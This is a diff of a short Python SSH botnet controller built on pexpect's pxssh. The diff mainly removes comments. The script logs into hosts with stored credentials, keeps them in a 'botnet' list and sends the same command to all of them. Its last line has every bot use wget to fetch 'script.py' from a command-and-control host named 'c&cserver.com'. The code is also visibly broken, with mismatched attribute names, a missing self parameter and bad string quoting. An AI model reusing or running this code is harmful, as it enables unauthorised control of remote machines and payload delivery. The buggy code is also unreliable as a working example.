@@ -1,14 +1,13 @@
 from pexpect import pxssh
 
 class Bot:
-    # Initialize new client
     def __init__(self, host, user, password):
         self.host = host
         self.user = user
         self.password = password
         self.sessions = self.ssh()
 
-    # SSH into client
+        
     def ssh(self):
         try:
             bot = pxssh.pxssh()
@@ -19,14 +18,12 @@ class Bot:
             print(e)
 
             
-    # Send command to client
     def send_command(self, cmd):
         self.session.sendline(cmd)
         self.session.prompt()
         return self.session.before
 
     
-    # Send a command to all bots in the botnet
     def command_bots(command):
         for bot in botnet:
             attack = bot.send_command(command)
@@ -36,12 +33,9 @@ class Bot:
 
 botnet = []
 def add_bot(host, user, password):
-    # Add a new bot to your botnet
     new_bot = Bot(host, user, password)
     botnet.append(new_bot)
 
 add_bot('{HOST IP}', '', '')
-
-# List user home directory and download
 command_bots('ls')
 command_bots("""wget -O /Users/Admin/Desktop/ "http://c&cserver.com/script.py"""")
